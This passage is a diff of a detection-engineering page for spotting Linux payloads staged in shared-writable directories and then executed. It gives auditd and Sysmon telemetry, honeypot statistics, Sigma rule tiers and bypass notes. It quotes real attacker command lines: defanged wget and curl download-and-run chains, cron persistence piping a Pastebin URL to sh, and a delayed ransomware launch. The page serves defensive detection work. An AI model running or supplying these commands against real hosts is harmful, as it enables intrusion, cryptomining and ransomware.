@@ -2,87 +2,120 @@
 # Evidence: auditd + Sysmon for Linux telemetry from two throwaway Azure VMs
 # (Debian 12, Rocky 9), authorized assumed-breach exercise 2026-09-28.
 # Operator: SancLogic. Target operator: JFrank.
-# Prior evidence: 153-day SSH honeypot (2026-04-27 to 2026-09-26 UTC),
-# 4,893 sessions fitting this shape out of 69,979 with commands.
-Name: SSH Land-and-Run
+# Field grounding: C0XMO (Gafgyt variant), Rocke cryptomining group, UNC3944.
+# Prior evidence: 153-day SSH honeypot observed the same staging pattern.
+#
+# Key change from v1: SSH is now one delivery vector, not the frame. The
+# invariant is file-backed staging in a shared-writable directory followed by
+# execution. In-memory pipes (190 sessions) are explicitly out of scope.
+Name: Linux Shared-Writable Staging to Execution (Land and Run)
 PageStandardVersion: 1
-Id: 7b15353b-9119-40c3-a1d6-13f9b692eb2a
+Id: 5e2a9c47-8b13-4f06-a1d5-3c7e9b2f6a80
 MitreIds:
-  - T1059.004    # Command and Scripting Interpreter: Unix Shell
-  - T1105        # Ingress Tool Transfer
-  - T1053.003    # Scheduled Task/Job: Cron
+  - T1105
+  - T1059.004
+  - T1053.003
+DetectionPriority: HIGH
 Tactics:
+  - Command and Control
   - Execution
   - Persistence
 Techniques:
-  - "Command and Scripting Interpreter: Unix Shell"
-  - "Ingress Tool Transfer"
-  - "Scheduled Task/Job: Cron"
-DetectionPriority: HIGH
+  - Ingress Tool Transfer
+  - 'Command and Scripting Interpreter: Unix Shell'
+  - 'Scheduled Task/Job: Cron'
 ThreatPrevalence: HIGH
 DetectionDifficulty: LOW
 Description: >
-  Every payload delivered over SSH must land on the host (file write) and
-  something must execute it (execve). The transfer method changes, the
-  launcher changes, but the file-write and process-execution events do not.
-  These two surfaces catch every variant regardless of delivery channel —
-  SSH native, C2 upload, or lateral movement. Lab-validated across 8
-  delivery/execution variants, a Sliver C2 implant, and an internal lateral
-  movement hop on two Linux distributions (Debian 12, Rocky 9) with auditd
-  and Sysmon for Linux. Of ~80k total log lines captured, ~780 were
-  operator-attributable exec events. Prior honeypot evidence: 4,893 of
-  69,979 sessions with commands (6.99%) staged and ran code over 153 days.
-LastUpdated: "2026-09-28"
+  Code that lands on a Linux host as a file in a shared-writable
+  directory (/tmp, /dev/shm, /var/tmp) must be written before it
+  can run. The write generates a file-creation event; execution
+  typically generates an execve, though shell builtins like source
+  run in the current process without one (see BN-04). Delivery
+  method changes (scp, wget, C2 upload, heredoc, lateral scp),
+  execution method changes (bash, chmod+exec, python3, cron,
+  nohup), but the file-write event does not. This covers file-backed staging only. Stdin-only
+  execution (curl | bash with no file on disk) and memory-only
+  execution (memfd_create) are out of scope. Lab-validated across
+  8 delivery/execution variants, a Sliver C2 implant, and a
+  lateral movement hop on Debian 12 and Rocky 9 with auditd and
+  Sysmon for Linux. Of ~80k total log lines captured, ~780 were
+  operator-attributable exec events. Same pattern seen in the wild:
+  C0XMO writes to /tmp/.cache, chmod 777, executes, deletes. Rocke
+  group stages to /tmp with cron persistence via /var/spool/cron.
+  On a 153-day SSH honeypot, 4,703 of the 5,020 sessions that
+  staged a file and ran or scheduled something (93.69%) wrote to a
+  shared-writable directory and then executed or scheduled the file
+  from there. The detection has to join on the file path, not the
+  delivery session, because 86.22% of the linked runs were only
+  scheduled with a cron line and would start later under crond.
+LastUpdated: '2026-10-04'
 Author: Jenna Frank
 CoConspirator: SancLogic
 
 TheConstant: >
-  New code delivered over SSH must exist either as a file or as an
-  interpreter's input stream, and some process must execute it. That holds
-  whatever transfer method (download, stdin, scp, C2 upload, lateral
-  movement) or launcher (the session shell, cron, systemd, nohup) is used.
+  New code staged as a file in a shared-writable directory must be written
+  before it can be executed. The delivery method (SSH channel, wget, curl,
+  scp, web shell) and the launcher (the session shell, cron, systemd,
+  nohup) can change; the file write and the execution cannot. This
+  chokepoint covers file-backed staging only. Code piped directly into an
+  interpreter with no file written (190 honeypot sessions) and code passed
+  as a command-line argument (python -c, perl -e) are out of scope and need
+  a separate process-lineage rule.
 
 Prerequisites:
-  - SSH access to the target host (valid credentials or key)
-  - Ability to write files to a staging directory (/tmp, /dev/shm, /var/tmp)
-  - A shell or interpreter to execute the payload
+  - A Linux host with /tmp, /var/tmp or /dev/shm present (virtually all distributions)
+  - Code that is not already on the host (living-off-the-land commands with no new code are out of scope)
+  - File-create telemetry with the writing process (Sysmon for Linux Event ID 11, or auditd watches on writable paths)
+  - Process-creation telemetry for every parent, including crond and systemd (Sysmon for Linux Event ID 1, or auditd execve)
 
 AttackerControls:
-  - Transfer method (scp, heredoc, base64, curl, wget, C2 upload, echo pipe)
-  - Payload format (bash, python, ELF binary, encoded)
-  - Execution method (bash, chmod+exec, source, python3, cron, nohup)
-  - Staging directory (/tmp, /dev/shm, /var/tmp, /var/spool/cron)
-  - Filename and timestamp (can masquerade and timestomp)
-  - C2 channel (can tunnel through SSH reverse forwards)
+  - Delivery method (scp, wget, curl, heredoc, C2 upload, lateral scp)
+  - Execution method (direct binary, bash, sh, python3, perl, cron, nohup)
+  - File naming and path within staging directories
+  - Timing between staging and execution
+  - Whether to use dot-prefix for hiding
 
 AttackerCannotControl:
-  - The file must be written to disk or tmpfs (generates a file-write event)
-  - The execve syscall must fire to run the payload (generates a process-creation event)
-  - Cron persistence requires a write to the cron spool directory
-  - These events are generated by the kernel, not userspace — the attacker cannot suppress them without root-level auditd tampering
+  - The file write to a staging directory generating a kernel-mediated event
+  - The execve syscall when executing the staged file
+  - The fact that both events are host-local and linkable by path
+  - That tmpfs-backed paths (/dev/shm) still generate file-write events
 
 Chokepoints:
-  - Stage: Payload Landing (the "land")
-    Input: Attacker has SSH access and a payload to deliver
-    Invariant: A file must be written to a staging directory
+  - Stage: Land
+    Input: Attacker has a way to write files on the host (SSH session, download utility, web shell, supply-chain implant)
+    Invariant: The payload must be written as a file to a path the system can execute.
     Observable: >
       auditd file-write event with key file_land on /tmp, /dev/shm, /var/tmp,
       /var/spool/cron; Sysmon for Linux EID 11 (FileCreate). Lab evidence:
       26 file_land events on deb12, 30 on rocky9 — every delivery method
       (scp, heredoc, base64, echo pipe, python write, C2 upload, lateral scp)
-      generated at least one file_land event.
+      generated at least one file_land event. Wild evidence: C0XMO writes
+      to /tmp/.cache via wget; Rocke stages to /tmp via curl/wget.
     WhyCantBypass: >
-      The payload must exist on the filesystem (or tmpfs) before it can execute.
-      Even memory-backed tmpfs (/dev/shm) generates file-write events because
+      Code that is not on the host has to arrive and be stored somewhere before
+      it can run. On the honeypot the 4,703 staged-then-executed sessions
+      arrived by stdin-to-file (4,055), download-to-file (463) and scp pull
+      (185). The method changed; the file write did not. The same pattern
+      appears in the wild: C0XMO/Gafgyt writes to /tmp/.cache, Rocke writes
+      to /var/tmp/kworkerds, and UNC3944 stages in /tmp on ESXi hosts. Even
+      memory-backed tmpfs (/dev/shm) generates file-write events because
       the kernel mediates the write. C2 uploads via Sliver still write to the
       target filesystem — lab evidence: Sliver upload to /dev/shm/.cache
       triggered file_land. Lateral movement SCP from rocky9 to deb12
       (/tmp/.svc) also triggered file_land on the second host.
     LogSources:
+      - Sysmon for Linux Event ID 11 (File Create)
       - "auditd: syscall watch -w /tmp -p wa -k file_land (and /dev/shm, /var/tmp, /var/spool/cron)"
-      - "Sysmon for Linux: Event ID 11 (FileCreate)"
     DetectionTier: Research
     SigmaRef: sigma-rules/ssh-land-and-run/research.yml
+    BypassNote: >
+      Code piped straight into an interpreter writes no file (190 honeypot
+      sessions, out of scope). Code passed as a command-line argument
+      (python -c, perl -e) writes none either. Files written outside the
+      three staging directories (home directories, /usr/local/bin) are outside
+      this rule's scope but use the same write-then-execute pattern.
     BypassNotes:
       - Id: BN-01
         Title: SSH authorized_keys persistence not caught
@@ -112,193 +145,207 @@ Chokepoints:
           (6,813 events), pidof (1,701 events), systemd-private tmp churn.
           A noise baseline excluding systemd-private-* and dracut initramfs
           paths is needed before this is analyst-usable.
-
-  - Stage: Payload Execution (the "run")
-    Input: Payload exists on the host
-    Invariant: The execve syscall fires
+  - Stage: Run
+    Input: The payload is on the host as a file
+    Invariant: Some process must execute the staged file, either directly by path or through an interpreter.
     Observable: >
-      auditd execve event with key exec_log; Sysmon for Linux EID 1
-      (ProcessCreate) with full command line. Lab evidence: every execution
-      method tested — bash, chmod+exec, source, python3, cron, nohup —
-      generated exec_log events. On deb12: 1 .update execution caught. On
-      rocky9: 6 .update executions, plus .cache, .payload, and
-      systemd-helper executions caught. Sysmon EID 1 captured full command
-      lines including chmod +x /tmp/.update && /tmp/.update &,
-      nohup /tmp/.update, python3 /tmp/t06.py, and
-      bash -c chmod +x /tmp/.update && /tmp/.update &.
+      Direct execution: auditd execve with the staged path as exe;
+      Sysmon EID 1 with Image under a staging directory. Lab evidence:
+      T02 chmod+exec and Sliver /tmp/.update hit the direct path.
+      Interpreter execution: auditd execve for the interpreter with
+      the staged path in argv; Sysmon EID 1 with CommandLine containing
+      the staged path. Lab evidence: T01 bash, T03 heredoc, T04 base64,
+      T06 python3 hit the interpreter path. T05 source is a known gap
+      (see BN-04). Wild evidence: C0XMO uses direct execution
+      (./.cache after chmod 777).
     WhyCantBypass: >
-      Every process on Linux starts with execve (or execveat). There is no
-      way to run code without this syscall. Bash, python3, chmod+exec, cron,
-      nohup — all generate execve. The kernel logs it, not userspace. Lab
-      evidence confirms this across both Debian and Rocky Linux kernels.
+      A file that is never executed has no effect. The honeypot showed three
+      launchers: a direct run in the session (648 sessions), a cron line only
+      (4,055), and a run from a separate SSH connection seconds later (2
+      sessions from src-5063). In the wild, C0XMO runs ./tmp/.cache directly,
+      Rocke uses nohup /var/tmp/kworkerds, and UNC3944 uses nohup sh -c
+      'sleep 14400 && /encrypt_.out'. The launcher varies; the execution
+      does not. A file on disk that does nothing is not a threat. To have
+      effect, something must read and act on it. Direct execution goes through
+      execve. Interpreter execution goes through execve for the interpreter,
+      with the staged path visible in the command line arguments.
     LogSources:
+      - Sysmon for Linux Event ID 1 (Process Creation)
       - "auditd: -a always,exit -F arch=b64 -S execve -F key=exec_log (and b32)"
-      - "Sysmon for Linux: Event ID 1 (ProcessCreate)"
     DetectionTier: Hunt
     SigmaRef: sigma-rules/ssh-land-and-run/hunt.yml
-
-  - Stage: Land Then Run on the Same Host (correlation)
-    Input: A staged file and a later execution of the same path
-    Invariant: The executed path must be the path that was written, on the same host
-    Observable: >
-      A file create under a staging directory followed by a process whose
-      Image is that same path, on the same host. Lab evidence: every variant
-      showed a file_land event for the path followed by an exec_log event for
-      the same path on the same host. The Sliver implant /tmp/.update was
-      written (file_land) then executed (exec_log) on both deb12 and rocky9.
-      The lateral-movement SCP to /tmp/.svc on deb12 showed the same
-      file_land-then-exec_log pair from an internal source.
-    WhyCantBypass: >
-      Joining on host and file path links a stage and a run even when they
-      happen in different SSH connections or when cron starts the file after
-      the session ends. The analyst rule correlates TargetFilename to Image;
-      runs through an interpreter (sh /tmp/w.sh) need a backend query that
-      finds the path inside CommandLine.
-    LogSources:
-      - "Sysmon for Linux: Event IDs 1 and 11"
-      - "auditd: execve plus file watches"
-    DetectionTier: Analyst
-    SigmaRef: sigma-rules/ssh-land-and-run/analyst.yml
+    BypassNote: >
+      Running from a staging directory is common for installers and build
+      tools, so this tier is for hunting, not alerting.
     BypassNotes:
       - Id: BN-04
-        Title: Interpreter-mediated runs not caught by Image path join
+        Title: Source builtin produces no new execve for the script
         Description: >
-          Runs through an interpreter (sh /tmp/w.sh, python3 /tmp/t06.py)
-          have the interpreter as Image, not the staged path. The analyst
-          rule's dot-prefix selection catches hidden files executed directly;
-          interpreter runs need a backend query matching the path inside
-          CommandLine.
+          T05 used source (.) to execute /tmp/t05.sh. The sourced script
+          runs in the current bash process — no new execve fires for the
+          script itself. Only external commands called by the sourced script
+          (logger in this case) generate exec_log. A sourced script using
+          only shell builtins would be invisible to execve-based detection.
+          file_land still catches the staging write.
+  - Stage: Land Then Run on the Same Host
+    Input: A staged file and a later execution of the same path
+    Invariant: The executed path must be the path that was written, on the same host.
+    Observable: >
+      A file create under a staging directory followed within 2 hours by a
+      process whose Image is that same path, on the same host. Lab evidence:
+      every land method hit file_land and every run method hit exec_log;
+      the lateral-movement hop proves the same pattern fires on internal
+      redeployment from a second host (T1021.004 / T1570).
+    WhyCantBypass: >
+      Joining on host and file path, not the delivery session, links a stage
+      and a run even when they happen in different connections or when cron or
+      systemd starts the file after the session ends.
+    LogSources:
+      - Sysmon for Linux Event IDs 1 and 11
+      - auditd execve plus file watches
+    DetectionTier: Analyst
+    SigmaRef: sigma-rules/ssh-land-and-run/analyst.yml
+    BypassNote: >
+      This rule catches direct execution only (Image under a staging
+      directory). Runs through an interpreter (sh /tmp/w.sh, perl
+      /tmp/solid.pl) have the path in CommandLine, not Image — those are
+      caught by the hunt rule. The full temporal correlation (file created
+      then executed on the same host) requires SIEM-specific queries
+      because it joins two logsource categories; see the RequiredCorrelation
+      section for Splunk and Elastic EQL examples. @reboot cron schedules
+      fall outside any short time window.
 
 Variations:
-  - Name: SCP file transfer then bash execution
-    VariantId: scp-bash
-    FirstSeen: "2026-Q3"
+  - Name: 'C0XMO/Gafgyt: SSH brute force, wget to /tmp, direct execution with cron persistence'
+    FirstSeen: '2024-03'
     Status: Active
-    ChokepointMapping: "scp file write to /tmp → bash execve"
-    NotesShort: scp payload to /tmp, then ssh target 'bash /tmp/payload.sh'
+    SourceURL: https://www.fortinet.com/blog/threat-research/inside-cross-platform-propagation-of-new-gafgyt-variant-c0xmo
+    NotesShort: 'wget -O /tmp/.cache; chmod 777 .cache; ./.cache; copies to /var/tmp/.sys, /dev/shm/.sys with cron */15'
     Notes: >
-      Lab markers T01 and T02. T01: scp t01.sh to /tmp, bash execution.
-      T02: scp t02.sh to /tmp, chmod +x then direct execution. Both
-      generated file_land (sftp-server open) and exec_log events. Also
-      used for Sliver implant delivery: scp MID_ORGAN to /tmp/.update (41MB
-      ELF binary), chmod+exec. Confirmed on both deb12 and rocky9.
-  - Name: Heredoc write then bash execution
-    VariantId: heredoc-bash
-    FirstSeen: "2026-Q3"
-    Status: Active
-    ChokepointMapping: "heredoc file write to /tmp → bash execve"
-    NotesShort: ssh target 'cat << EOF > /tmp/t03.sh ... EOF && bash /tmp/t03.sh'
-    Notes: >
-      Lab marker T03. The heredoc is written by the session shell (bash),
-      generating a file_land event with bash as the writing process. The
-      same bash then executes it. Single SSH command, two chokepoint events.
-  - Name: Base64 decode then execution
-    VariantId: base64-decode-exec
-    FirstSeen: "2026-Q3"
-    Status: Active
-    ChokepointMapping: "base64 decode write to /tmp → bash execve"
-    NotesShort: echo [B64] | base64 -d > /tmp/t04.sh && bash /tmp/t04.sh
-    Notes: >
-      Lab marker T04. Payload encoded as base64, decoded and written to /tmp
-      on the target. file_land fires on the write; exec_log fires on the
-      bash execution. The encoding is an attacker control; the file write
-      and execve are not.
-  - Name: Echo pipe then source execution
-    VariantId: echo-pipe-source
-    FirstSeen: "2026-Q3"
-    Status: Active
-    ChokepointMapping: "echo write to /tmp → source (.) execve"
-    NotesShort: echo "logger ..." > /tmp/t05.sh && source /tmp/t05.sh
-    Notes: >
-      Lab marker T05. The source builtin reads and executes commands from
-      the file in the current shell context. file_land fires on the echo
-      redirect; exec_log fires for any external commands the sourced script
-      calls (logger in this case).
-  - Name: Python write then python execution
-    VariantId: python-write-exec
-    FirstSeen: "2026-Q3"
-    Status: Active
-    ChokepointMapping: "scp python file to /tmp → python3 execve"
-    NotesShort: scp t_py.py to /tmp/t06.py then python3 /tmp/t06.py
-    Notes: >
-      Lab marker T_PY. Python payload delivered via scp, executed with
-      python3. file_land fires for the scp write; exec_log fires for
-      python3. Sysmon EID 1 captured the full command line including the
-      script path.
-  - Name: C2 upload to tmpfs then implant execution
-    VariantId: c2-upload-tmpfs
-    FirstSeen: "2026-Q3"
-    Status: Active
-    ChokepointMapping: "Sliver C2 upload to /dev/shm → execute via implant"
-    NotesShort: Sliver upload command writes to /dev/shm/.cache; executed via implant
-    Notes: >
-      Reverse shell payload uploaded through the Sliver C2 session to
-      /dev/shm/.cache — a memory-backed tmpfs commonly used by attackers
-      to avoid disk forensics. file_land caught the write regardless because
-      auditd watches tmpfs the same as disk. The implant executed it via
-      bash, generating exec_log. This variant proves the chokepoint catches
-      C2-channel delivery, not just SSH-native delivery.
-  - Name: Lateral movement SCP redeployment
-    VariantId: lateral-scp-redeploy
-    FirstSeen: "2026-Q3"
-    Status: Active
-    ChokepointMapping: "internal scp from rocky9 to deb12 /tmp/.svc → nohup execve"
-    NotesShort: scp /tmp/.update sanc@10.50.0.4:/tmp/.svc then remote nohup execution
-    Notes: >
-      The attacker moved from rocky9 to deb12 on the internal subnet
-      (10.50.0.0/26), deploying the Sliver implant via scp to /tmp/.svc and
-      executing with nohup. file_land on deb12 caught the file landing;
-      exec_log caught the execution. This proves the chokepoint is not
-      limited to initial access — the same file-write + execve pattern fires
-      on internal pivots (T1021.004 / T1570).
-  - Name: Cron persistence via spool write
-    VariantId: cron-spool-persist
-    FirstSeen: "2026-Q3"
-    Status: Active
-    SourceURL: https://attack.mitre.org/techniques/T1053/003/
-    ChokepointMapping: "crontab write or direct spool write → deferred crond execve"
-    NotesShort: crontab - or echo | tee to /var/spool/cron/crontabs/
-    Notes: >
-      Two variants tested. Rocky9 (crontab installed): echo "* * * * *
-      /tmp/.update" | crontab - generated file_land on /var/spool/cron via
-      crontab's temp file rename. Debian (no crontab binary): direct write
-      to /var/spool/cron/crontabs/sanc and /var/spool/cron/crontabs/root
-      via tee. Both generated file_land events. The "run" is deferred — crond
-      would execute /tmp/.update on the next minute boundary.
-  - Name: Download to a file, run directly (honeypot)
-    VariantId: wget-chmod-run
-    FirstSeen: "2026-Q2"
-    Status: Active
-    SourceURL: https://attack.mitre.org/techniques/T1105/
-    ChokepointMapping: "sshd shell → wget -O bot (land) → chmod 777 → ./bot (run)"
-    NotesShort: wget -O bot; chmod 777 bot; ./bot
-    Notes: >
-      463 staged-then-executed sessions on the SSH honeypot (153 days, 69,979
-      sessions) first staged with a download to a file. Most run the file in
-      the same request. This is the most common non-stdin land method seen in
-      the wild. The lab exercise confirmed the same pattern with SCP delivery.
+      C0XMO is a Gafgyt variant that brute-forces SSH, then stages and
+      executes from shared-writable directories. The attack chain:
+      cd /tmp; wget -q -O .cache; chmod 777 .cache; ./.cache; rm -f .cache.
+      It copies itself to /tmp/.sys, /var/tmp/.sys, /dev/shm/.sys and
+      $HOME/.sys (chmod 755), and persists with cron (*/15 * * * *) and
+      shell profile modification (~/.bashrc, ~/.profile, ~/.bash_profile).
+      The file write to /tmp and the direct execution are the invariant;
+      the secondary copies to /var/tmp and /dev/shm also land in this
+      chokepoint's staging directories.
+    ChokepointMapping: 'SSH brute force -> cd /tmp -> wget -O .cache (land) -> chmod 777 -> ./.cache (run) -> cp to /var/tmp/.sys, /dev/shm/.sys -> cron */15 (persistence)'
     Command:
-      Invocation: "wget hxxp://src-3856:8080/bot.amd64 -O bot; chmod 777 bot; ./bot telnet.amd64; rm -f bot"
+      Invocation: 'cd /tmp; wget -q hxxp://[C2]/bot[.]arch -O .cache; chmod 777 .cache; ./.cache; rm -f .cache'
       Artifacts:
-        - "Honeypot transcript, session ae6fc296-6cd7-4590-a316-8721cf8a4e96"
-  - Name: Payload over SSH stdin, run by cron (honeypot)
-    VariantId: stdin-cron-deferred
-    FirstSeen: "2026-Q2"
+        - 'Fortinet FortiGuard Labs, C0XMO analysis, 2024'
+  - Name: 'Rocke Group: cryptominer staged to /var/tmp with cron and systemd persistence'
+    FirstSeen: '2019-01'
+    Status: Active
+    SourceURL: https://intezer.com/blog/cloud-security/rocke-group-actively-targeting-the-cloud-wants-your-ssh-keys/
+    NotesShort: 'curl/wget to /var/tmp/kworkerds; nohup execution; cron */10 with pastebin stager'
+    Notes: >
+      Rocke Group targets cloud Linux hosts, staging the XMRig miner as
+      /var/tmp/kworkerds (masquerading as a kernel thread name) with its
+      config at /var/tmp/config.json. Delivery: curl -fsSL -o
+      /var/tmp/kworkerds || wget -O /var/tmp/kworkerds, chmod +x, nohup
+      /var/tmp/kworkerds >/dev/null 2>&1 &. Persistence: cron scripts in
+      /etc/cron.hourly/oanacroner, /etc/cron.daily/oanacroner,
+      /etc/cron.monthly/oanacroner, and direct crontab modification with
+      */10 * * * * piping a Pastebin URL to sh. Also installs a systemd
+      service (sshservice.service) and modifies /etc/bashrc. The write to
+      /var/tmp and the nohup execution are the invariant stages.
+    ChokepointMapping: 'curl/wget -> /var/tmp/kworkerds (land) -> chmod +x -> nohup /var/tmp/kworkerds (run) -> cron */10 pastebin|sh (persistence)'
+    Command:
+      Invocation: '(curl -fsSL --connect-timeout 120 hxxps://master[.]minerxmr[.]ru/One/x1 -o /var/tmp/kworkerds||wget hxxps://master[.]minerxmr[.]ru/One/x1 -O /var/tmp/kworkerds) && chmod +x /var/tmp/kworkerds'
+      Artifacts:
+        - 'Intezer, Rocke Group analysis, 2019'
+        - 'Zscaler ThreatLabZ, Rocke cryptominer analysis'
+  - Name: 'UNC3944: SCP to /tmp on ESXi, nohup execution with time delay'
+    FirstSeen: '2023-09'
+    Status: Active
+    SourceURL: https://cloud.google.com/blog/topics/threat-intelligence/defending-vsphere-from-unc3944/
+    NotesShort: 'SCP ransomware to /tmp/encrypt.out; chmod 0777; nohup with 4-hour sleep'
+    Notes: >
+      UNC3944 (Scattered Spider) pushes ransomware binaries to /tmp on ESXi
+      hosts via SCP/SFTP over SSH. The chain: chmod 0777 encrypt.out; cp
+      encrypt.out encrypt_.out; nohup sh -c 'sleep 14400 && /encrypt_.out
+      -pass [key] -skip_vms /list.txt' &. The 4-hour sleep delay means the
+      execution happens long after the SSH session ends. The file write to
+      /tmp and the later execution are the invariant. Also installs Teleport
+      as a persistent backdoor at /usr/local/bin/teleport with a systemd
+      unit. While this is ESXi-specific, the staging pattern (/tmp write,
+      chmod, delayed execution) is the same chokepoint.
+    ChokepointMapping: 'SSH/SCP -> /tmp/encrypt.out (land) -> chmod 0777 -> nohup sh -c sleep && /encrypt_.out (run, delayed 4h)'
+    Command:
+      Invocation: 'chmod 0777 encrypt.out; cp encrypt.out encrypt_.out; nohup sh -c ''sleep 14400 && /encrypt_.out -pass [REDACTED] -skip_vms /list.txt'' &'
+      Artifacts:
+        - 'Google Cloud Threat Intelligence, UNC3944/Scattered Spider analysis, 2023'
+  - Name: Payload over the SSH channel, run by cron (honeypot)
+    FirstSeen: '2026-04'
     Status: Active
     SourceURL: https://attack.mitre.org/techniques/T1053/003/
-    ChokepointMapping: "sshd shell → cat > w.sh (land) → chmod +x → crontab @reboot / hourly → crond runs w.sh (run, deferred)"
     NotesShort: cat > w.sh from stdin, then a cron line; never run inside the session
     Notes: >
-      4,055 sessions on the SSH honeypot. The loader writes w.sh from the SSH
-      channel's stdin, marks it executable, schedules it @reboot and hourly
-      with a cron line, and adds a systemd user unit. None of the sessions
-      ran its file directly. On a real host the run starts under crond, outside
-      the SSH session. The lab exercise validated the same cron persistence
-      pattern via crontab and direct spool write.
+      4,055 honeypot sessions. The loader writes w.sh from the SSH channel's
+      stdin, marks it executable, schedules it @reboot and hourly with a cron
+      line, and adds a systemd user unit. None of the 4,117 cat > file
+      sessions ran its file directly. On a real host the run would start under
+      crond, outside the SSH session. The stdin bytes and the unit body were
+      not captured. SSH is the delivery vector here; the chokepoint is the
+      file write to /tmp and the cron-scheduled execution.
+    ChokepointMapping: 'sshd shell -> cat > /tmp/w.sh (land) -> chmod +x -> crontab @reboot / hourly -> crond runs w.sh (run, deferred)'
     Command:
-      Invocation: "cd \"/tmp\" && if [ ! -f \"w[.]sh\" ]; then cat > \"w[.]sh\" && chmod +x w[.]sh; fi"
+      Invocation: 'cd "/tmp" && if [ ! -f "w[.]sh" ]; then cat > "w[.]sh" && chmod +x w[.]sh; fi'
       Artifacts:
-        - "Honeypot transcript, session 8596ef87-77a4-4b79-afcb-ddc279fe4ace"
+        - 'Honeypot transcript, session 8596ef87-77a4-4b79-afcb-ddc279fe4ace'
+  - Name: Download to a file, run directly (honeypot)
+    FirstSeen: '2026-05'
+    Status: Active
+    SourceURL: https://attack.mitre.org/techniques/T1105/
+    NotesShort: wget -O bot; chmod 777 bot; ./bot
+    Notes: >
+      463 staged-then-executed honeypot sessions first staged with a download
+      to a file. Most run the file in the same request, so the stage-to-run
+      gap is logging resolution (direct runs: median 0.00 s, p90 0.11 s, max
+      14.81 s). This is the same pattern as C0XMO and Rocke in the wild.
+    ChokepointMapping: 'sshd shell -> wget -O bot (land) -> chmod 777 -> ./bot (run)'
+    Command:
+      Invocation: 'wget hxxp://src-3856:8080/bot.amd64 -O bot; chmod 777 bot; ./bot telnet.amd64; rm -f bot'
+      Artifacts:
+        - 'Honeypot transcript, session ae6fc296-6cd7-4590-a316-8721cf8a4e96'
+  - Name: scp pull with an embedded key, run through sh (honeypot)
+    FirstSeen: '2026-06'
+    Status: Active
+    SourceURL: https://attack.mitre.org/techniques/T1021/004/
+    NotesShort: scp -i key.ppk user@host:sh out_sh, then sh out_sh; curl | sh fallback
+    Notes: >
+      185 honeypot sessions from 3 sources. The loader writes an embedded
+      private key, pulls its payload with scp, and runs it with sh. If scp
+      fails it falls back to curl piped to sh. No wget or curl runs when scp
+      succeeds, so a download-utility rule misses it; a file-then-execute
+      join does not. This variation shows interpreter consumption: Image is
+      sh, the staged path is in CommandLine.
+    ChokepointMapping: 'sshd shell -> scp pull to /tmp/out_sh (land) -> sh /tmp/out_sh (run; Image is sh, path in CommandLine)'
+    Command:
+      Invocation: 'cd /tmp; echo ''<private-key-redacted>'' > key.ppk; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@dst-002:sh out_sh; ...'
+      Artifacts:
+        - 'Honeypot transcript, session 7a0ffac4-1397-463f-a8dd-4fcd3061f985'
+  - Name: Stage and run split across SSH connections (honeypot)
+    FirstSeen: '2026-09'
+    Status: Active
+    SourceURL: https://attack.mitre.org/techniques/T1059/004/
+    NotesShort: scp -t push in one connection, run 3 seconds later in the next
+    Notes: >
+      2 honeypot sessions from one source (src-5063). It pushed a file with
+      scp -t, then ran perl /tmp/solid.pl 3 seconds later in a new SSH
+      connection, and later repeated this with an archive (tar zxfv m.tgz;
+      ./go). A per-session correlation misses both halves; a join on the
+      file path does not. The archive case also shows why file-create events
+      beat command-line name matching: tar writes files whose names the
+      command line never shows.
+    ChokepointMapping: 'connection 1: scp -t /tmp/solid.pl (land) -> connection 2: perl /tmp/solid.pl (run)'
+    Command:
+      Invocation: 'perl /tmp/solid.pl >/dev/null 2>&1;rm -rf /tmp/solid*;uname -a'
+      Artifacts:
+        - 'Honeypot transcript, session 81442679-d87f-4e90-84f1-bf335ea61fbc'
 
 Detections:
   - Level: Research
@@ -308,69 +355,183 @@ Detections:
     LogSources:
       - Sysmon for Linux Event ID 11
       - auditd file watches (-w /tmp -p wa -k file_land)
-    Logic: "Any file created under /tmp/, /var/tmp/ or /dev/shm/."
+    Logic: 'Any file created under /tmp/, /var/tmp/ or /dev/shm/. Baseline of which processes and users normally write there.'
     ExpectedFPRate: High
     UseCase: Learning normal staging-directory writes before tuning the hunt and analyst tiers
     SigmaRule: sigma-rules/ssh-land-and-run/research.yml
     Validation:
       RuleStatus: Experimental
       State: Lab-validated
+      TestedOn:
+        - Debian 12 (6.1.0-53-cloud-amd64) with auditd + Sysmon for Linux 1.5.3
+        - Rocky Linux 9.8 (5.14.0-687) with auditd + Sysmon for Linux 1.5.3
       Backends:
-        - "auditd (exec_log + file_land keys) on Debian 12 and Rocky 9"
-        - "Sysmon for Linux 1.5.3 on Debian 12 and Rocky 9"
+        - sigma-cli 3.1.0 / pySigma 1.5.1 (sigma check and EQL/Lucene conversion via pySigma-backend-elasticsearch)
       Notes: >
-        Validated 2026-09-28. All 8 delivery methods generated file_land
+        Lab-validated 2026-09-28. All 8 delivery methods generated file_land
         events: 26 on deb12, 30 on rocky9. High noise from system activity
         confirmed — baseline tuning required.
   - Level: Hunt
     Description: >
-      A process run from a staging directory, filtering known system paths.
+      A process run from a staging directory (direct execution) or an
+      interpreter consuming a file from a staging directory (interpreter
+      execution), filtering known system paths.
     LogSources:
       - Sysmon for Linux Event ID 1
       - auditd execve
     Logic: >
-      Image starts with /tmp/, /var/tmp/ or /dev/shm/, excluding
+      Direct: Image starts with /tmp/, /var/tmp/ or /dev/shm/.
+      Interpreter: Image is a known interpreter (bash, sh, python3, python,
+      perl) and CommandLine contains a staging directory path. Both exclude
       systemd-private, dracut, and initramfs paths.
+    CorrelationNote: >
+      These rules surface candidate events. Correlation of file_land and
+      exec_log by host, staged path, and time window is performed at the
+      hunt workflow level, not within the individual Sigma rules.
     ExpectedFPRate: Medium
-    UseCase: Hunting for execution from staging directories on SSH-exposed hosts
+    UseCase: Hunting for execution from staging directories
     SigmaRule: sigma-rules/ssh-land-and-run/hunt.yml
     Validation:
       RuleStatus: Experimental
       State: Lab-validated
+      TestedOn:
+        - Debian 12 (6.1.0-53-cloud-amd64) with auditd + Sysmon for Linux 1.5.3
+        - Rocky Linux 9.8 (5.14.0-687) with auditd + Sysmon for Linux 1.5.3
       Backends:
-        - "auditd (exec_log) on Debian 12 and Rocky 9"
-        - "Sysmon for Linux 1.5.3 on Debian 12 and Rocky 9"
+        - sigma-cli 3.1.0 / pySigma 1.5.1 (sigma check and EQL/Lucene conversion via pySigma-backend-elasticsearch)
       Notes: >
-        Validated 2026-09-28. All execution methods (bash, chmod+exec,
-        source, python3, cron, nohup) generated exec_log events. System
-        noise filters reduce volume significantly.
+        Lab-validated 2026-09-28. Direct execution (T02 chmod+exec, Sliver
+        /tmp/.update) matched selection_direct. Interpreter execution
+        (T01 bash, T03 heredoc, T04 base64, T06 python3) matched
